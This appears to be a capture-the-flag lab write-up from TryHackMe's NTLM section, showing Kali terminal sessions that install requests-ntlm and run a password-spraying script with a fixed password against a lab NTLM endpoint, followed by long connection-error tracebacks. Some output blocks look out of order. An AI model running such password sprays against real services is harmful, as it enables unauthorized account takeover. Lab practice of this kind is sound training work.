
# NTLM Authenticated Services

1. Download this task's tasks files and unzip it

![]()

```Bash
┌──(kali㉿kali)-[~]
└─$ unzip ~/Downloads/passwordsprayer.zip 
Archive:  /home/kali/Downloads/passwordsprayer.zip
  inflating: ntlm_passwordspray.py   
  inflating: usernames.txt
```

```Bash
┌──(kali㉿kali)-[~]
└─$ pip install requests-ntlm
Defaulting to user installation because normal site-packages is not writeable
Collecting requests-ntlm
  Downloading requests_ntlm-1.2.0-py3-none-any.whl (6.0 kB)
Requirement already satisfied: cryptography>=1.3 in /usr/lib/python3/dist-packages (from requests-ntlm) (38.0.4)
Collecting pyspnego>=0.1.6
  Downloading pyspnego-0.9.1-py3-none-any.whl (132 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 132.9/132.9 kB 602.7 kB/s eta 0:00:00
Requirement already satisfied: requests>=2.0.0 in /usr/lib/python3/dist-packages (from requests-ntlm) (2.28.1)
Installing collected packages: pyspnego, requests-ntlm
  WARNING: The script pyspnego-parse is installed in '/home/kali/.local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location. 
Successfully installed pyspnego-0.9.1 requests-ntlm-1.2.0
```

```Bash
┌──(kali㉿kali)-[~]
└─$ python3 ntlm_passwordspray.py
Traceback (most recent call last):
  File "/home/kali/ntlm_passwordspray.py", line 4, in <module>
    from requests_ntlm import HttpNtlmAuth
```

```Bash
┌──(kali㉿kali)-[~]
└─$ python3 ntlm_passwordspray.py
ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
ModuleNotFoundError: No module named 'requests_ntlm'
```

```Bash
┌──(kali㉿kali)-[~]
└─$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/~    
[*] Starting passwords spray attack using the following password: Changeme123
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 174, in _new_conn
    conn = connection.create_connection(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 73, in create_connection
    for res in socket.getaddrinfo(host, port, family, socket.SOCK_STREAM):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/socket.py", line 962, in getaddrinfo
    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
socket.gaierror: [Errno -2] Name or service not known

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 704, in urlopen
    httplib_response = self._make_request(
                       ^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 399, in _make_request
    conn.request(method, url, **httplib_request_kw)
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 239, in request
    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
  File "/usr/lib/python3.11/http/client.py", line 1282, in request
    self._send_request(method, url, body, headers, encode_chunked)
  File "/usr/lib/python3.11/http/client.py", line 1328, in _send_request
    self.endheaders(body, encode_chunked=encode_chunked)
  File "/usr/lib/python3.11/http/client.py", line 1277, in endheaders
    self._send_output(message_body, encode_chunked=encode_chunked)
  File "/usr/lib/python3.11/http/client.py", line 1037, in _send_output
    self.send(msg)
  File "/usr/lib/python3.11/http/client.py", line 975, in send
    self.connect()
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 205, in connect
    conn = self._new_conn()
           ^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 186, in _new_conn
    raise NewConnectionError(
urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x7fa4403ff550>: Failed to establish a new connection: [Errno -2] Name or service not known

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 489, in send
    resp = conn.urlopen(
           ^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 788, in urlopen
    retries = retries.increment(
              ^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/urllib3/util/retry.py", line 592, in increment
    raise MaxRetryError(_pool, url, error or ResponseError(cause))
urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='ntlmauth.za.tryhackme.com', port=80): Max retries exceeded with url: /~ (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7fa4403ff550>: Failed to establish a new connection: [Errno -2] Name or service not known'))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/kali/ntlm_passwordspray.py", line 72, in <module>
    main(sys.argv[1:])
  File "/home/kali/ntlm_passwordspray.py", line 63, in main
    sprayer.password_spray(password, attackurl)
  File "/home/kali/ntlm_passwordspray.py", line 24, in password_spray
    response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/api.py", line 73, in get
    return request("get", url, params=params, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/api.py", line 59, in request
    return session.request(method=method, url=url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 587, in request
    resp = self.send(prep, **send_kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 701, in send
    r = adapter.send(request, **kwargs)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 565, in send
    raise ConnectionError(e, request=request)
requests.exceptions.ConnectionError: HTTPConnectionPool(host='ntlmauth.za.tryhackme.com', port=80): Max retries exceeded with url: /~ (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7fa4403ff550>: Failed to establish a new connection: [Errno -2] Name or service not known'))
```

